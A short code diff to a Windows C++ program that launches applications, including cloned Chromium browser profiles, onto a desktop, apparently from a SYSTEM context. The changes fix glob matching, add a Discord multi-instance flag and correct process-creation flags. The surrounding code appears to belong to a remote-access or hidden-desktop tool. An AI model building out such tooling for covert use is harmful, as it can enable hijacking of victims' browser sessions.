@@ -1541,7 +1541,7 @@ static wstring ResolveGlob(const wstring& path) {
                 wstring name = entry.path().filename().wstring();
                 // Simple pattern matching (starts with pattern before *)
                 size_t pStar = pattern.find(L'*');
-                wstring prefix = pattern.substr(0, pStar);
+                wstring prefix = (pStar != wstring::npos) ? pattern.substr(0, pStar) : pattern;
                 if (name.rfind(prefix, 0) == 0) {
                     matches.push_back(entry.path().wstring());
                 }
@@ -2325,6 +2325,10 @@ static void LaunchOnDesktop(string path, bool isRetry = false, bool cloneBrowser
 
         bool isConsoleApp = (exeBase == "cmd.exe" || exeBase == "powershell.exe" || exeBase == "pwsh.exe" || exeBase == "wscript.exe" || exeBase == "cscript.exe");
 
+        if (exeBase == "discord.exe") {
+            cmd += " --multi-instance";
+        }
+
         if (g_chromiumBrowsers.count(exeBase)) {
             bool isOperaGX = (exeBase == "opera.exe" && path.find("Opera GX") != string::npos);
             if (isOperaGX) pidKey = "operagx.exe";
@@ -2470,7 +2474,6 @@ static void LaunchOnDesktop(string path, bool isRetry = false, bool cloneBrowser
         std::vector<wchar_t> cmdLine(wCmd.begin(), wCmd.end());
         cmdLine.push_back(L'\0');
 
-        uint32_t createFlags = CREATE_UNICODE_ENVIRONMENT | (isConsoleApp ? CREATE_NEW_CONSOLE : 0u);
         HANDLE launchToken = NULL;
         if (IsSystem()) {
             launchToken = GetLaunchToken();
@@ -2486,6 +2489,11 @@ static void LaunchOnDesktop(string path, bool isRetry = false, bool cloneBrowser
                 }
                 FreeLibrary(hUserEnv);
             }
+        }
+
+        uint32_t createFlags = (isConsoleApp ? CREATE_NEW_CONSOLE : 0u);
+        if (envBlock) {
+            createFlags |= CREATE_UNICODE_ENVIRONMENT;
         }
 
         PROCESS_INFORMATION pi = {0};
